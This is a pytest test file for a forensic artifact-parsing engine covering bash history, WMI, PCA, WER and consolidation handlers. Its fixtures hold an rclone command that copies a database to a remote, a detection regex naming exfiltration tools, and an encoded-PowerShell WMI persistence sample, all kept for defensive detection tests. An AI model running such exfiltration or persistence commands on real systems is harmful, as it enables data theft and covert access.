import logging
from pathlib import Path

from artifact_engine.core import consolidate
from artifact_engine.core.detector import Machine, Volume
from artifact_engine.core.runner import ParserContext, run_parser
from artifact_engine.core.runner import marker_path as runner_marker
from artifact_engine.core.scheduler import _topo_order
from artifact_engine.models import ParserManifest


def _ctx(evidence: Path, out: Path) -> ParserContext:
    # A real logger, not None: handlers call ctx.log.warning(), so passing None
    # here made the fixture disagree with the contract every handler relies on.
    return ParserContext(
        evidence=evidence, out=out, tools=evidence, assets=evidence,
        machine_name="host", volume="live", log=logging.getLogger("aeng.test"),
    )


def test_topo_order_respects_dependencies():
    a = ParserManifest(id="a", handler="m:f")
    b = ParserManifest(id="b", handler="m:f", depends_on=["a"])
    order = [p.id for p in _topo_order([b, a])]
    assert order.index("a") < order.index("b")


def test_build_argv_preserves_spaces(tmp_path):
    from artifact_engine.core.runner import _build_argv
    ctx = _ctx(Path(r"C:\a b\C"), Path(r"C:\a b\C\CSVs"))
    binary = Path(r"C:\Artifact Engine\mft.exe")
    argv = _build_argv(["{binary}", "transcode", "{evidence}/$MFT"], ctx, binary)
    assert argv[0] == r"C:\Artifact Engine\mft.exe"   # single arg despite the space
    assert argv[1] == "transcode"
    assert argv[2] == r"C:\a b\C/$MFT"


def test_runner_skips_when_requirement_missing(tmp_path):
    p = ParserManifest(id="x", handler="m:f", requires=["no_existe"])
    r = run_parser(p, _ctx(tmp_path, tmp_path / "CSVs"))
    assert r.status == "skipped"


def test_handler_bash_history(tmp_path):
    alice = tmp_path / "[root]" / "home" / "alice"
    alice.mkdir(parents=True)
    (alice / ".bash_history").write_text("ls\nwhoami\n", encoding="utf-8")
    bob = tmp_path / "[root]" / "home" / "bob"
    bob.mkdir(parents=True)
    (bob / ".bash_history").write_text("id\nsudo su\nrclone copy /srv/db remote:x\n",
                                       encoding="utf-8")
    # analyst indicator list (assets == evidence in _ctx); inline comment stripped
    (tmp_path / "suspicious_tools.txt").write_text(
        "exfil_tool = \\brclone\\b|\\bmega(cmd|sync)\\b   # exfil staging\n",
        encoding="utf-8")

    p = ParserManifest(id="bash", handler="artifact_engine.handlers.lin_bash:run")
    r = run_parser(p, _ctx(tmp_path, tmp_path / "CSVs"))

    assert r.status == "ok"
    out = (tmp_path / "CSVs" / "bash.csv").read_text(encoding="utf-8")
    assert "1,alice,bash,,ls" in out
    assert "2,alice,bash,,whoami" in out
    assert "1,bob,bash,,id" in out         # sequential id resets per user
    assert "2,bob,bash,,sudo su" in out
    assert "3,bob,bash,exfil_tool,rclone copy /srv/db remote:x" in out


def test_runner_idempotent_unless_forced(tmp_path):
    user = tmp_path / "[root]" / "home" / "alice"
    user.mkdir(parents=True)
    (user / ".bash_history").write_text("ls\n", encoding="utf-8")
    p = ParserManifest(id="bash", handler="artifact_engine.handlers.lin_bash:run")
    ctx = _ctx(tmp_path, tmp_path / "CSVs")

    assert run_parser(p, ctx).status == "ok"
    r2 = run_parser(p, ctx)               # already done -> skipped
    assert r2.status == "skipped" and "parsed" in r2.detail
    assert run_parser(p, ctx, force=True).status == "ok"   # force re-runs


def test_clean_output_names(tmp_path):
    from artifact_engine.core.runner import _clean_output_names
    (tmp_path / "20260620231505_Amcache_ProgramEntries.csv").write_text("a")
    (tmp_path / "20260620211506_SrumECmd_NetworkUsages_Output.csv").write_text("b")
    (tmp_path / "BamDam.csv").write_text("c")  # RECmd canonical --csvf output
    sub = tmp_path / "20260621084411"          # RECmd redundant timestamp subfolder
    sub.mkdir()
    (sub / "BamDam_BamDam.csv").write_text("c")
    (tmp_path / "Security.csv").write_text("d")  # already clean, untouched

    _clean_output_names(tmp_path, before=set())

    names = {p.name for p in tmp_path.glob("*.csv")}
    assert names == {"Amcache_ProgramEntries.csv", "SrumECmd_NetworkUsages.csv", "BamDam.csv", "Security.csv"}
    assert not sub.exists()  # timestamp subfolder dropped


def test_clean_output_names_with_short(tmp_path):
    from artifact_engine.core.runner import _clean_output_names
    # SrumECmd / SBECmd ignore --csvf: short normalizes the prefix (one dir per parser)
    srum = tmp_path / "srum"
    srum.mkdir()
    (srum / "20260620211506_SrumECmd_NetworkUsages_Output.csv").write_text("a")
    (srum / "jdoe_UsrClass.csv").write_text("b")  # (SBECmd-style per-user file)
    _clean_output_names(srum, before=set(), short="srum")
    assert (srum / "srum_NetworkUsages.csv").is_file()        # tool prefix replaced
    assert (srum / "srum_jdoe_UsrClass.csv").is_file()     # plain name prefixed

    db = tmp_path / "deepblue"
    db.mkdir()
    (db / "DeepBlue-Security.csv").write_text("c")            # deepblue handler output
    _clean_output_names(db, before=set(), short="deepblue")
    assert (db / "deepblue_Security.csv").is_file()


def test_machine_info_handler_no_hives(tmp_path):
    import json

    from artifact_engine.handlers import win_systeminfo
    out = tmp_path / "CSVs"
    win_systeminfo.run(_ctx(tmp_path, out))  # no hives: must not crash
    data = json.loads((out / "machine_info.json").read_text(encoding="utf-8"))
    assert data["volume"] == "live"


def test_report_includes_machine_info(tmp_path):
    from artifact_engine.core import report
    (tmp_path / "CSVs").mkdir()
    (tmp_path / "CSVs" / "machine_info.json").write_text(
        '{"machine_name":"HOST1","product_name":"Windows 10","build":"19045",'
        '"IPs":["10.0.0.5"],"users":{"alice":"S-1-5-21"}}',
        encoding="utf-8",
    )
    m = Machine("x", "windows", "kape", "windows_kape", tmp_path, "src", [Volume("C", tmp_path, True)])
    report.build(m, [])
    txt = (tmp_path / "report.txt").read_text(encoding="utf-8")
    assert "HOST1" in txt and "10.0.0.5" in txt and "alice" in txt


def test_consolidate_builds_db_and_xlsx(tmp_path):
    (tmp_path / "CSVs").mkdir()
    (tmp_path / "CSVs" / "foo.csv").write_text("a,b\n1,2\n3,4\n", encoding="utf-8")
    m = Machine("host", "linux", "uac", "linux_uac", tmp_path, "src", [Volume("live", tmp_path, True)])

    consolidate.build(m)

    assert (tmp_path / "host.db").is_file()
    assert (tmp_path / "host.xlsx").is_file()


def test_the_xlsx_keeps_every_column_of_every_row(tmp_path):
    """Regression: pandas writes cells COLUMN by column and xlsxwriter's
    constant_memory mode drops anything written back into an already flushed row,
    so `to_excel` produced sheets whose columns past the first were empty except
    on the last row -- silently, in the file the analyst actually opens."""
    import pandas as pd

    (tmp_path / "CSVs").mkdir()
    (tmp_path / "CSVs" / "foo.csv").write_text(
        "a,b,c\n1,x,p\n2,y,q\n3,z,\n", encoding="utf-8")
    m = Machine("host", "linux", "uac", "linux_uac", tmp_path, "src",
                [Volume("live", tmp_path, True)])

    consolidate.build(m)

    df = pd.read_excel(tmp_path / "host.xlsx", sheet_name="foo")
    assert list(df.columns) == ["a", "b", "c"]
    assert list(df["a"]) == [1, 2, 3]
    assert list(df["b"]) == ["x", "y", "z"]
    assert list(df["c"][:2]) == ["p", "q"]
    assert pd.isna(df["c"][2])              # an empty cell stays empty


def test_consolidate_reports_progress_steps(tmp_path):
    """on_step fires once per input file (db pass) and once per .xlsx sheet."""
    (tmp_path / "CSVs").mkdir()
    (tmp_path / "CSVs" / "foo.csv").write_text("a,b\n1,2\n", encoding="utf-8")
    (tmp_path / "JSONs").mkdir()
    (tmp_path / "JSONs" / "procs.json").write_text('[{"pid":1}]', encoding="utf-8")
    m = Machine("host", "windows", "kape", "windows_kape", tmp_path, "src",
                [Volume("C", tmp_path, True)])

    calls: list[int] = []
    consolidate.build(m, on_step=lambda: calls.append(1))

    # 2 inputs (db pass) + 2 sheets (both fit Excel -> xlsx pass) = 4 steps.
    assert consolidate.count_inputs(m) == 2
    assert len(calls) == 4


def test_consolidate_emit_xlsx_false_skips_excel(tmp_path):
    """emit_xlsx=False builds only the .db (the big speed-up: no .xlsx pass)."""
    (tmp_path / "CSVs").mkdir()
    (tmp_path / "CSVs" / "foo.csv").write_text("a,b\n1,2\n", encoding="utf-8")
    m = Machine("host", "windows", "kape", "windows_kape", tmp_path, "src",
                [Volume("C", tmp_path, True)])

    steps: list[int] = []
    consolidate.build(m, on_step=lambda: steps.append(1), emit_xlsx=False)

    assert (tmp_path / "host.db").is_file()
    assert not (tmp_path / "host.xlsx").exists()
    assert len(steps) == 1            # only the read/db step, no xlsx step


def test_consolidate_emit_db_false_skips_sqlite(tmp_path):
    """emit_db=False builds only the .xlsx (no .db)."""
    import openpyxl

    (tmp_path / "CSVs").mkdir()
    (tmp_path / "CSVs" / "foo.csv").write_text("a,b\n1,2\n", encoding="utf-8")
    m = Machine("host", "windows", "kape", "windows_kape", tmp_path, "src",
                [Volume("C", tmp_path, True)])

    consolidate.build(m, emit_db=False)

    assert not (tmp_path / "host.db").exists()
    wb = openpyxl.load_workbook(tmp_path / "host.xlsx", read_only=True)
    assert "foo" in set(wb.sheetnames)
    wb.close()


def test_count_inputs_counts_csv_and_json(tmp_path):
    (tmp_path / "CSVs" / "Registry").mkdir(parents=True)
    (tmp_path / "CSVs" / "Registry" / "a.csv").write_text("x\n1\n", encoding="utf-8")
    (tmp_path / "CSVs" / "b.csv").write_text("x\n1\n", encoding="utf-8")
    (tmp_path / "JSONs").mkdir()
    (tmp_path / "JSONs" / "c.json").write_text("[]", encoding="utf-8")
    m = Machine("h", "windows", "kape", "windows_kape", tmp_path, "src",
                [Volume("C", tmp_path, True)])
    assert consolidate.count_inputs(m) == 3   # 2 csv (recursive) + 1 json


def test_live_machine_excludes_nested_vss_csvs(tmp_path):
    """A VSS<n> subfolder under the live machine's CSVs/ (stale pre-refactor output)
    must NOT be consolidated into the live machine's .db -- VSS is its own machine."""
    (tmp_path / "CSVs" / "Filesystem").mkdir(parents=True)
    (tmp_path / "CSVs" / "Filesystem" / "mft.csv").write_text("a\n1\n", encoding="utf-8")
    # nested VSS output that used to live under C in the old design
    (tmp_path / "CSVs" / "VSS1" / "Filesystem").mkdir(parents=True)
    (tmp_path / "CSVs" / "VSS1" / "Filesystem" / "mft.csv").write_text("a\n9\n", encoding="utf-8")
    m = Machine("host", "windows", "kape", "windows_kape", tmp_path, "src",
                [Volume("C", tmp_path, True)])
    assert consolidate.count_inputs(m) == 1                     # VSS1 excluded
    assert consolidate._iter_csvs(tmp_path / "CSVs") == [tmp_path / "CSVs" / "Filesystem" / "mft.csv"]
    consolidate.build(m)
    import sqlite3
    conn = sqlite3.connect(tmp_path / "host.db")
    tables = {r[0] for r in conn.execute("SELECT name FROM sqlite_master WHERE type='table'")}
    conn.close()
    assert tables == {"mft"}                                    # only the live copy, no VSS table


def test_consolidate_machine_worker_reports_to_queue(tmp_path):
    """The pool worker builds outputs, pushes step ticks + a final done marker
    tagged with its index, and returns (idx, None) on success."""
    import queue as _queue

    (tmp_path / "CSVs").mkdir()
    (tmp_path / "CSVs" / "foo.csv").write_text("a,b\n1,2\n", encoding="utf-8")
    m = Machine("host", "windows", "kape", "windows_kape", tmp_path, "src",
                [Volume("C", tmp_path, True)])
    q: _queue.Queue = _queue.Queue()

    idx, err = consolidate.consolidate_machine(3, m, q)

    assert (idx, err) == (3, None)
    assert (tmp_path / "host.db").is_file() and (tmp_path / "host.xlsx").is_file()
    items = []
    while not q.empty():
        items.append(q.get())
    assert all(it[0] == 3 for it in items)   # every tick tagged with our index
    assert (3, True) in items                # at least one step
    assert items[-1] == (3, False)           # final done marker last


def test_consolidate_machine_worker_pickles_for_process_pool():
    """Args submitted to the process pool (Machine + bools) must be picklable."""
    import pickle

    m = Machine("h", "windows", "kape", "windows_kape", Path("/x"), "src",
                [Volume("C", Path("/x"), True)])
    back = pickle.loads(pickle.dumps((0, m, True, False)))
    assert back[1].name == "h" and back[1].volumes[0].name == "C"


def test_consolidate_all_multi_machine_thread_path(tmp_path):
    """_consolidate_all over 2 machines (parse_processes=false -> thread path):
    both get their .db/.xlsx and report.txt; the drain/report plumbing holds."""
    from artifact_engine import cli
    from artifact_engine.config import Config

    results = []
    for name in ("A", "B"):
        d = tmp_path / name
        (d / "CSVs").mkdir(parents=True)
        (d / "CSVs" / "foo.csv").write_text("a,b\n1,2\n", encoding="utf-8")
        m = Machine(name, "windows", "kape", "windows_kape", d, "src",
                    [Volume("C", d, True)])
        results.append((m, []))

    cli._consolidate_all(results, Config(max_workers=2, parse_processes=False), tmp_path)

    for name in ("A", "B"):
        assert (tmp_path / name / f"{name}.db").is_file()
        assert (tmp_path / name / f"{name}.xlsx").is_file()
        assert (tmp_path / name / "report.txt").is_file()


def test_cleanup_outputs_removes_scratch_and_empty_jsons(tmp_path):
    from artifact_engine.core.scheduler import cleanup_outputs
    (tmp_path / "CSVs" / "Registry").mkdir(parents=True)
    (tmp_path / "CSVs" / "Registry" / "reg.csv").write_text("a\n1\n", encoding="utf-8")
    (tmp_path / "CSVs" / "Registry" / ".work_reg_x").mkdir()      # leftover scratch
    (tmp_path / "JSONs").mkdir()                                  # empty (no LiveResponse)
    m = Machine("h", "windows", "kape", "windows_kape", tmp_path, "src",
                [Volume("C", tmp_path, True)])

    cleanup_outputs(m)

    assert not (tmp_path / "CSVs" / "Registry" / ".work_reg_x").exists()
    assert (tmp_path / "CSVs" / "Registry" / "reg.csv").is_file()   # real output kept
    assert not (tmp_path / "JSONs").exists()                        # empty JSONs dropped


def test_cleanup_outputs_keeps_populated_jsons(tmp_path):
    from artifact_engine.core.scheduler import cleanup_outputs
    (tmp_path / "JSONs").mkdir()
    (tmp_path / "JSONs" / "processes.json").write_text("[]", encoding="utf-8")
    m = Machine("h", "windows", "kape", "windows_kape", tmp_path, "src",
                [Volume("C", tmp_path, True)])
    cleanup_outputs(m)
    assert (tmp_path / "JSONs" / "processes.json").is_file()         # not removed


def test_consolidate_includes_liveresponse_json(tmp_path):
    """LiveResponse json/ artifacts (and suspicious findings) land in .db/.xlsx
    with an lr_ prefix, alongside the CSV tables."""
    import json
    import sqlite3

    (tmp_path / "CSVs").mkdir()
    (tmp_path / "CSVs" / "foo.csv").write_text("a,b\n1,2\n", encoding="utf-8")
    js = tmp_path / "JSONs"
    js.mkdir()
    # array of objects (a normalised artifact); nested dict kept as JSON text
    (js / "processes.json").write_text(
        json.dumps([{"Pid": 1, "Name": "a", "Hash": {"MD5": "x"}}, {"Pid": 2, "Name": "b"}]),
        encoding="utf-8")
    # suspicious.json: the findings array is the table
    (js / "suspicious.json").write_text(
        json.dumps({"machine": "h", "counts": {"total": 1},
                    "findings": [{"rule": "r", "severity": "high", "detail": "d",
                                  "fields": {"k": "v"}}]}), encoding="utf-8")
    (js / "empty.json").write_text("[]", encoding="utf-8")     # 0 rows -> no table

    m = Machine("host", "windows", "kape", "windows_kape", tmp_path, "src",
                [Volume("C", tmp_path, True)])
    consolidate.build(m)

    con = sqlite3.connect(tmp_path / "host.db")
    tables = {r[0] for r in con.execute("select name from sqlite_master where type='table'")}
    assert {"foo", "lr_processes", "lr_suspicious"} <= tables
    assert "lr_empty" not in tables                            # empty array dropped
    assert con.execute("select count(*) from lr_processes").fetchone()[0] == 2
    # nested dict serialised to JSON text, not exploded into columns
    cols = [d[1] for d in con.execute("PRAGMA table_info(lr_processes)")]
    assert "Hash" in cols and "Hash.MD5" not in cols
    sev = con.execute("select severity from lr_suspicious").fetchone()[0]
    assert sev == "high"
    con.close()
    assert (tmp_path / "host.xlsx").is_file()


def test_consolidate_no_size_filter_xlsx_guards_only_excel_limit(tmp_path, monkeypatch):
    """Every CSV lands in the .db; the .xlsx only drops sheets past Excel's row limit."""
    import sqlite3

    import openpyxl

    (tmp_path / "CSVs").mkdir()
    (tmp_path / "CSVs" / "small.csv").write_text("a,b\n1,2\n", encoding="utf-8")
    (tmp_path / "CSVs" / "big.csv").write_text(
        "a,b\n" + "1,2\n" * 5, encoding="utf-8"
    )  # 5 rows
    monkeypatch.setattr(consolidate, "_XLSX_MAX_ROWS", 4)  # so 'big' (5 rows) exceeds it
    m = Machine("host", "windows", "kape", "windows_kape", tmp_path, "src",
                [Volume("C", tmp_path, True)])

    consolidate.build(m)

    con = sqlite3.connect(tmp_path / "host.db")
    tables = {r[0] for r in con.execute("select name from sqlite_master where type='table'")}
    con.close()
    assert {"small", "big"} <= tables          # .db has both, regardless of size

    wb = openpyxl.load_workbook(tmp_path / "host.xlsx", read_only=True)
    sheets = set(wb.sheetnames)
    wb.close()
    assert "small" in sheets                   # fits Excel -> in .xlsx
    assert "big" not in sheets                 # exceeds row limit -> .db only


def test_tools_lock_records_hashes(tmp_path):
    import hashlib
    import json

    from artifact_engine import cli
    from artifact_engine.models import ParserManifest, Tool, ToolSource

    (tmp_path / "EvtxECmd.exe").write_bytes(b"binary-bytes")
    p = ParserManifest(
        id="x", handler="m:f",
        tool=Tool(binary="EvtxECmd.exe", source=ToolSource(url="https://e/EvtxECmd.zip")),
    )
    cli._write_tools_lock(tmp_path, [p])

    lock = json.loads((tmp_path / "tools.lock.json").read_text(encoding="utf-8"))
    assert lock["EvtxECmd.exe"]["sha256"] == hashlib.sha256(b"binary-bytes").hexdigest()
    assert lock["EvtxECmd.exe"]["source"].endswith("EvtxECmd.zip")


def test_run_summary_aggregates(tmp_path):
    import json

    from artifact_engine.core import report
    from artifact_engine.core.runner import ParserRun

    m1 = Machine("A", "windows", "kape", "windows_kape", tmp_path / "A", "src",
                 [Volume("C", tmp_path / "A", True)])
    m2 = Machine("B", "linux", "uac", "linux_uac", tmp_path / "B", "src",
                 [Volume("live", tmp_path / "B", True)])
    runs1 = [ParserRun("p1", "C", "ok", 1.0, ""),
             ParserRun("p2", "C", "error", 2.0, "boom"),
             ParserRun("p3", "C", "skipped", 0.0, "artifact missing")]
    runs2 = [ParserRun("q1", "live", "ok", 5.0, "")]

    summary = report.build_run_summary(tmp_path, [(m1, runs1), (m2, runs2)])

    assert summary["machines"] == 2
    assert summary["totals"] == {"ok": 2, "skipped": 1, "errors": 1}
    assert summary["errors"][0]["parser"] == "p2"
    data = json.loads((tmp_path / "run-summary.json").read_text(encoding="utf-8"))
    assert data["totals"]["errors"] == 1
    txt = (tmp_path / "run-summary.txt").read_text(encoding="utf-8")
    assert "A" in txt and "B" in txt and "boom" in txt


def test_run_summary_long_name_does_not_collide(tmp_path):
    """A machine name as wide as the old fixed column must not touch the OS column."""
    from artifact_engine.core import report
    from artifact_engine.core.runner import ParserRun

    long_name = "sample-host-01_uac"  # 18 chars - exactly the old field width
    m = Machine(long_name, "linux", "uac", "linux_uac", tmp_path / long_name, "src",
                [Volume("live", tmp_path / long_name, True)])
    report.build_run_summary(tmp_path, [(m, [ParserRun("p", "live", "ok", 1.0, "")])])

    txt = (tmp_path / "run-summary.txt").read_text(encoding="utf-8")
    assert f"{long_name}linux" not in txt          # no collision
    assert f"{long_name}  linux" in txt            # 2-space gutter


def test_consolidate_zero_row_csv_in_both_db_and_xlsx(tmp_path):
    """A header-only CSV (parsed, no hits) is mirrored as a 0-row table AND sheet."""
    import sqlite3

    import openpyxl

    (tmp_path / "CSVs").mkdir()
    (tmp_path / "CSVs" / "nohits.csv").write_text("col1,col2\n", encoding="utf-8")
    m = Machine("host", "windows", "kape", "windows_kape", tmp_path, "src",
                [Volume("C", tmp_path, True)])

    consolidate.build(m)

    con = sqlite3.connect(tmp_path / "host.db")
    tables = {r[0] for r in con.execute("select name from sqlite_master where type='table'")}
    con.close()
    wb = openpyxl.load_workbook(tmp_path / "host.xlsx", read_only=True)
    sheets = set(wb.sheetnames)
    wb.close()
    assert "nohits" in tables   # 0-row table kept in .db
    assert "nohits" in sheets   # and mirrored in .xlsx (parity)


def test_handler_usn_noop_without_journal(tmp_path):
    """$Extend present but no $J collected -> clean no-op, no crash, no output."""
    from artifact_engine.handlers import win_usn
    (tmp_path / "$Extend").mkdir()
    out = tmp_path / "CSVs"
    win_usn.run(_ctx(tmp_path, out))
    assert not (out / "usn.csv").exists()


def test_handler_timeline_noop_without_db(tmp_path):
    """No ActivitiesCache.db -> HandlerSkip (reported skipped, no .done marker)."""
    import pytest

    from artifact_engine.core.runner import HandlerSkip
    from artifact_engine.handlers import win_timeline
    (tmp_path / "Users").mkdir()
    with pytest.raises(HandlerSkip):
        win_timeline.run(_ctx(tmp_path, tmp_path / "CSVs"))


def test_handler_sum_noop_without_mdb(tmp_path):
    """SUM dir present but no .mdb -> clean no-op (doesn't require SumECmd/esentutl)."""
    from artifact_engine.handlers import win_sum
    (tmp_path / "Windows" / "System32" / "LogFiles" / "SUM").mkdir(parents=True)
    win_sum.run(_ctx(tmp_path, tmp_path / "CSVs"))  # must not raise


def test_handler_hayabusa_skips_without_binary(tmp_path):
    """No hayabusa binary in tools/ -> clean skip (doesn't require the tool)."""
    from artifact_engine.core.runner import HandlerSkip
    from artifact_engine.handlers import win_eventlogs_hayabusa
    logs = tmp_path / "Windows" / "System32" / "winevt" / "Logs"
    logs.mkdir(parents=True)
    (logs / "Security.evtx").write_bytes(b"ElfFile\x00")     # presence only
    ctx = _ctx(tmp_path, tmp_path / "CSVs")                   # tools = tmp_path (no hayabusa/)
    try:
        win_eventlogs_hayabusa.run(ctx)
        raised = False
    except HandlerSkip:
        raised = True
    assert raised
    assert not (tmp_path / "CSVs" / "hayabusa.csv").exists()


def test_docs_parser_and_profile_counts_are_current():
    """README and ARCHITECTURE advertise how many parsers/profiles ship. Those
    numbers drifted three releases behind (92 vs 95) because nothing checked them,
    and a stale count in the README is the first thing a reader distrusts. Pin them
    to the manifests so adding a parser fails here until the docs follow."""
    import re as _re

    from artifact_engine.config import Config
    from artifact_engine.registry import load_parsers, load_profiles

    parsers = load_parsers(Config().parser_dirs)
    total = len(parsers)
    win = sum(1 for p in parsers if p.os == "windows")
    lin = sum(1 for p in parsers if p.os == "linux")
    profiles = len(load_profiles(Config().profile_dirs))
    repo = Path(__file__).resolve().parent.parent

    readme = (repo / "README.md").read_text(encoding="utf-8")
    assert f"forensic%20parsers-{total}-" in readme, "README badge count is stale"
    # the prose may wrap, so match across whitespace rather than a fixed line
    assert _re.search(rf"\*\*{total}\s+forensic\s+parsers\*\*", readme), \
        "README prose count is stale"

    arch = (repo / "docs" / "ARCHITECTURE.md").read_text(encoding="utf-8")
    m = _re.search(r"\*\*Current state\*\*: (\d+) parsers \((\d+) Windows / (\d+) Linux\), "
                   r"(\d+) detection profiles", arch)
    assert m, "ARCHITECTURE '**Current state**' line no longer parses"
    assert [int(x) for x in m.groups()] == [total, win, lin, profiles], \
        f"ARCHITECTURE counts stale: {m.groups()} vs {(total, win, lin, profiles)}"


def test_every_date_column_declares_its_basis_in_the_docs():
    """ARCHITECTURE §5 claims a full sweep found every date-bearing CSV column and
    labels each `_utc` / `_local` / deliberately-unsuffixed. That claim went stale
    (`sudo_log.time_local`, `fortigate.time_local`, `cron_log.timestamp` and the
    aggregate web `first_seen`/`last_seen` were all missing), and an analyst who
    trusts an unlisted column's zone reads the hours wrong. Re-run the sweep here so
    a new parser's timestamp cannot ship undocumented."""
    import re as _re

    repo = Path(__file__).resolve().parent.parent
    handlers = repo / "src" / "artifact_engine" / "handlers"
    arch = (repo / "docs" / "ARCHITECTURE.md").read_text(encoding="utf-8")
    # the doc groups siblings as `bodyfile.{atime,mtime}_utc`: expand before matching
    for brace in _re.finditer(r"\{([a-z0-9_,]+)\}([a-z0-9_]*)", arch):
        arch += "".join(f" {part}{brace.group(2)}" for part in brace.group(1).split(","))

    datey = _re.compile(
        r'"([a-z0-9_]*(?:time|date|seen|stamp|visit|modif|creat|instal|latest)[a-z0-9_]*)"')
    # names that read as dates but are not: a duration, a service, a registry value
    not_a_date = {"timeout", "timezone", "datetime", "update", "endpoint", "timer",
                  "time_provider", "visit_count", "eventtime", "installed_by"}

    found: set[str] = set()
    for f in sorted(handlers.glob("*.py")):
        src = f.read_text(encoding="utf-8")
        for blk in _re.finditer(r"\[((?:[^\[\]]|\n)*?)\]", src):
            body = blk.group(1)
            if body.count('"') < 4:        # not a header list
                continue
            found |= {c for c in datey.findall(body) if c not in not_a_date}

    missing = sorted(c for c in found if c not in arch)
    assert not missing, (
        f"date column(s) not declared in ARCHITECTURE §5: {missing} - add each to the "
        "_utc / _local / no-suffix list, or to not_a_date here if it is not a date")


def test_bundled_parsers_load():
    """Every bundled manifest validates (catches a broken new YAML)."""
    import yaml as _yaml

    from artifact_engine.config import DATA_DIR, Config
    from artifact_engine.registry import load_parsers

    ids = {p.id for p in load_parsers(Config().parser_dirs)}
    assert {
        "browser", "wmi_persistence", "wmi_ccm_rua", "pca", "wer", "search_index",
        "lnk", "jumplists", "recyclebin", "sum", "recentfilecache", "usn", "timeline",
        "bash", "users", "cron", "ssh", "wtmp",  # linux (no linux_ prefix)
        "network", "logins", "processes", "machineinfo", "anomalies",  # linux live-response
        "auth", "packages", "hashes", "bodyfile",  # linux wave 2
        "sigma",  # linux sigma detections
    } <= ids

    # Every bundled yaml must become a loaded parser. Two ways a manifest is
    # silently dropped, both of which once hid the Windows `yara` behind the
    # Linux one: a duplicate id (load_parsers dedups by id) OR a duplicate
    # FILENAME (the override mechanism dedups by basename across the rglob, so
    # windows/x.yaml and linux/x.yaml collide even with distinct ids).
    files = list((DATA_DIR / "parsers").rglob("*.yaml"))
    names = [f.name for f in files]
    dup_names = sorted({n for n in names if names.count(n) > 1})
    assert not dup_names, f"parser filename collision across OS folders: {dup_names}"
    file_ids = [_yaml.safe_load(f.read_text(encoding="utf-8"))["id"] for f in files]
    dup_ids = sorted({i for i in file_ids if file_ids.count(i) > 1})
    assert not dup_ids, f"duplicate parser id(s) across OS folders: {dup_ids}"
    assert len(load_parsers(Config().parser_dirs)) == len(files)


def test_handler_pca(tmp_path):
    from artifact_engine.handlers import win_pca
    pca = tmp_path / "Windows" / "appcompat" / "pca"
    pca.mkdir(parents=True)
    (pca / "PcaAppLaunchDic.txt").write_text(
        "C:\\Users\\bob\\evil.exe|2023-09-21 13:25:30.123\n"
        "\\\\SHARE\\tools\\psexec.exe|2023-09-21 14:00:00.000\n",
        encoding="utf-16",
    )
    out = tmp_path / "CSVs"
    win_pca.run(_ctx(tmp_path, out))
    text = (out / "pca.csv").read_text(encoding="utf-8")
    # PCA writes the host's LOCAL time with no offset in the string, and it is a
    # verbatim passthrough -> the header must say `_local`, never bare or `_utc`
    assert text.splitlines()[0] == "executable_path,last_executed_local"
    assert "evil.exe,2023-09-21 13:25:30.123" in text
    assert "\\\\SHARE\\tools\\psexec.exe" in text


def test_handler_wer(tmp_path):
    from artifact_engine.handlers import win_wer
    rep = tmp_path / "ProgramData" / "Microsoft" / "Windows" / "WER" / "ReportArchive" / "Crit_1"
    rep.mkdir(parents=True)
    (rep / "Report.wer").write_text(
        "Version=1\n"
        "EventType=APPCRASH\n"
        "EventTime=133401600000000000\n"
        "AppPath=C:\\Windows\\System32\\evil.exe\n"
        "Sig[0].Name=Application Name\nSig[0].Value=evil.exe\n"
        "Sig[6].Name=Fault Module Name\nSig[6].Value=ntdll.dll\n",
        encoding="utf-16",
    )
    out = tmp_path / "CSVs"
    win_wer.run(_ctx(tmp_path, out))
    text = (out / "wer.csv").read_text(encoding="utf-8")
    # FILETIME's epoch is 1601 UTC, so the rendered value is UTC -> `_utc` header
    assert text.splitlines()[0].startswith("report,event_type,event_time_utc,")
    assert "APPCRASH" in text
    assert "C:\\Windows\\System32\\evil.exe" in text
    assert "ntdll.dll" in text
    assert ",2023-09-26 00:00:00," in text  # EventTime FILETIME -> UTC date-time


def test_handler_wmi_persistence(tmp_path):
    from artifact_engine.handlers import win_wmi
    repo = tmp_path / "Windows" / "System32" / "wbem" / "Repository"
    repo.mkdir(parents=True)
    blob = (
        b"\x00" * 32
        + b'_FilterToConsumerBinding.Consumer="CommandLineEventConsumer.Name=\"Evil\"" '
        + b'Filter="__EventFilter.Name=\"EvilFlt\""'
        + b"\x00" * 64
        + b"CommandLineEventConsumer\x00\x00powershell.exe -enc QQBBQQ==\x00\x00Evil\x00\x00"
        + b"EvilFlt\x00\x00SELECT * FROM __InstanceModificationEvent WITHIN 60\x00\x00"
    )
    (repo / "OBJECTS.DATA").write_bytes(blob)
    out = tmp_path / "CSVs"
    win_wmi.persistence(_ctx(tmp_path, out))
    text = (out / "wmi_persistence.csv").read_text(encoding="utf-8")
    assert "Evil-EvilFlt" in text
    assert "CommandLineEventConsumer" in text
    assert "powershell.exe -enc QQBBQQ==" in text
    assert "SELECT * FROM __InstanceModificationEvent WITHIN 60" in text


def test_handler_wmi_ccm_rua_xml(tmp_path):
    from artifact_engine.handlers import win_wmi
    repo = tmp_path / "Windows" / "System32" / "wbem" / "Repository"
    repo.mkdir(parents=True)
    blob = (
        b"junk......"
        b"<CCM_RecentlyUsedApps>"
        b"<CompanyName>Evil Corp</CompanyName>"
        b"<ExplorerFileName>evil.exe</ExplorerFileName>"
        b"<FolderPath>C:\\Temp</FolderPath>"
        b"<LastUsedTime>20230921132530.000000+000</LastUsedTime>"
        b"<LastUserName>DOMAIN\\admin</LastUserName>"
        b"</CCM_RecentlyUsedApps>"
    )
    (repo / "OBJECTS.DATA").write_bytes(blob)
    out = tmp_path / "CSVs"
    win_wmi.ccm_rua(_ctx(tmp_path, out))
    text = (out / "wmi_ccm_rua.csv").read_text(encoding="utf-8")
    head = text.splitlines()[0]
    assert "last_used_time_utc" in head and "timestamp1_utc,timestamp2_utc" in head
    assert "evil.exe" in text
    assert "2023-09-21 13:25:30" in text     # already UTC (+000) -> unchanged
    assert "DOMAIN\\admin" in text


def test_wmi_cim_datetime_offset_is_applied_not_dropped(tmp_path):
    """CCM's LastUsedTime is a CIM_DATETIME whose trailing `sUUU` is the record's
    offset from UTC IN MINUTES. Truncating at the seconds (the old behaviour) kept
    the local wall-clock while the column claims UTC -- a silent 2 h error on a
    Madrid client. The offset is applied instead, so `+120` moves BACK to UTC."""
    from artifact_engine.handlers.win_wmi import _wmi_used_time

    assert _wmi_used_time("20230921132530.000000+000") == "2023-09-21 13:25:30"  # already UTC
    assert _wmi_used_time("20230921132530.000000+120") == "2023-09-21 11:25:30"  # UTC+2 -> UTC
